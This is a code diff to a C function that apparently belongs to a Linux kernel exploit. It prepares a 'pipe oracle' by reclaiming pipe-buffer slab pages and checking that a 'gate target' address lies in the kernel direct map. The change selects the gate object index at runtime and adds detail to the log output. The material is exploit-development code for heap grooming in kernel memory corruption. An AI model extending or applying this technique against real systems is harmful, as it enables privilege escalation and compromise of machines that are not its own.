@@ -938,6 +938,8 @@ int prepare_p0_pipe_oracle(void) {
   }
   p0_gate_holders_initialized = 1;
 
+  select_p0_gate_object_index();
+
   pipebuf_page_base = prepare_pipe_buffer_page();
   if (!is_plausible_reclaim_base(pipebuf_page_base)) {
     pr_error("p0 pipe oracle rejected reclaim base=%016zx\n",
@@ -948,12 +950,12 @@ int prepare_p0_pipe_oracle(void) {
 
   uintptr_t gate_target =
       pipebuf_page_base +
-      (uintptr_t)P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+      (uintptr_t)g_p0_gate_object_index * PIPE_OBJECT_SIZE;
   if (!is_direct_ptr(gate_target) ||
       !is_direct_ptr(gate_target + PIPE_OBJECT_SIZE - 1)) {
     pr_error("p0 pipe oracle gate target not in direct map target=%016zx "
-             "base=%016zx\n",
-             gate_target, pipebuf_page_base);
+             "base=%016zx index=%d\n",
+             gate_target, pipebuf_page_base, g_p0_gate_object_index);
     pipebuf_page_base = 0;
     return 0;
   }
@@ -968,9 +970,9 @@ int prepare_p0_pipe_oracle(void) {
     }
   }
   pr_info("p0 pipe oracle prepared base=%016zx gate_target=%016zx "
-          "gate_index=%d obj_size=0x%x pipes=%d gate_slots=1\n",
-          pipebuf_page_base, gate_target, P0_ORACLE_GATE_OBJECT_INDEX,
-          (unsigned)PIPE_OBJECT_SIZE, PIPE_RECLAIM);
+          "gate_index=%d obj_size=0x%x pipes=%d gate_slots=%d\n",
+          pipebuf_page_base, gate_target, g_p0_gate_object_index,
+          (unsigned)PIPE_OBJECT_SIZE, PIPE_RECLAIM, (int)PIPE_OBJS_PER_SLAB);
   return 1;
 }
 
